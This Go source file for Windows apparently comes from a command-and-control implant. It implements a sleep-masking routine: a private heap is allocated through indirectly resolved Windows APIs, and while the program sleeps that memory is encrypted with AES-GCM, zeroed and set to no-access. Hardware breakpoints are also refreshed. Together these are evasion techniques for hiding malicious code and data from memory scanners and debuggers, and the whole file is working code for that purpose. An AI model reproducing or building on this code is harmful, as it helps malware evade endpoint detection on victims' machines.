//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	sensitiveHeap     uintptr
	sensitiveHeapSize uintptr
	sensitiveHeapUsed uintptr
	sensitiveHeapMu   sync.Mutex
)

const (
	MEM_COMMIT       = 0x1000
	MEM_RESERVE      = 0x2000
	MEM_RELEASE      = 0x8000
	MEM_PRIVATE      = 0x20000
	PAGE_READWRITE   = 0x04
	PAGE_NOACCESS    = 0x01
	sensitiveHeapCap = 256 * 1024
)

type MEMORY_BASIC_INFORMATION struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

func initSleepEncryption() {
	va := getProc(mKernel32, fVirtualAlloc)
	addr, _, _ := syscall.SyscallN(va,
		0, sensitiveHeapCap,
		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE,
	)
	if addr != 0 {
		sensitiveHeap = addr
		sensitiveHeapSize = sensitiveHeapCap
	}
}

func storeSensitive(data []byte) uintptr {
	sensitiveHeapMu.Lock()
	defer sensitiveHeapMu.Unlock()
	if sensitiveHeap == 0 {
		return 0
	}
	needed := uintptr(len(data) + 4)
	if sensitiveHeapUsed+needed > sensitiveHeapSize {
		return 0
	}
	offset := sensitiveHeapUsed
	base := sensitiveHeap + offset
	*(*uint32)(unsafe.Pointer(base)) = uint32(len(data))
	copy(unsafe.Slice((*byte)(unsafe.Pointer(base+4)), len(data)), data)
	sensitiveHeapUsed += needed
	return offset
}

func readSensitive(offset uintptr) []byte {
	sensitiveHeapMu.Lock()
	defer sensitiveHeapMu.Unlock()
	if sensitiveHeap == 0 || offset >= sensitiveHeapSize {
		return nil
	}
	base := sensitiveHeap + offset
	length := *(*uint32)(unsafe.Pointer(base))
	if uintptr(length) > sensitiveHeapSize-offset-4 {
		return nil
	}
	out := make([]byte, length)
	copy(out, unsafe.Slice((*byte)(unsafe.Pointer(base+4)), length))
	return out
}

func maskSleep(mem []byte, duration time.Duration, lock bool) {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		time.Sleep(duration)
		return
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		time.Sleep(duration)
		return
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		time.Sleep(duration)
		return
	}
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	plain := append([]byte(nil), mem...)
	ct := gcm.Seal(nil, nonce, plain, []byte("sockpuppets-sleep-mask-v1"))
	for i := range mem {
		mem[i] = 0
	}
	var oldProtect uint32
	if lock && sensitiveHeap != 0 {
		syscall.SyscallN(rpVirtualProtect, sensitiveHeap, sensitiveHeapSize, PAGE_NOACCESS,
			uintptr(unsafe.Pointer(&oldProtect)))
	}
	time.Sleep(duration)
	if lock && sensitiveHeap != 0 {
		syscall.SyscallN(rpVirtualProtect, sensitiveHeap, sensitiveHeapSize, PAGE_READWRITE,
			uintptr(unsafe.Pointer(&oldProtect)))
	}
	out, err := gcm.Open(nil, nonce, ct, []byte("sockpuppets-sleep-mask-v1"))
	if err == nil && len(out) == len(mem) {
		copy(mem, out)
	}
}

func sleepEncrypted(duration time.Duration) {
	defer func() { recover() }()
	refreshHardwareBreakpoints()
	if sensitiveHeap == 0 || sensitiveHeapUsed == 0 {
		local := make([]byte, 32)
		rand.Read(local)
		maskSleep(local, duration, false)
		return
	}
	mem := unsafe.Slice((*byte)(unsafe.Pointer(sensitiveHeap)), sensitiveHeapUsed)
	maskSleep(mem, duration, true)
}
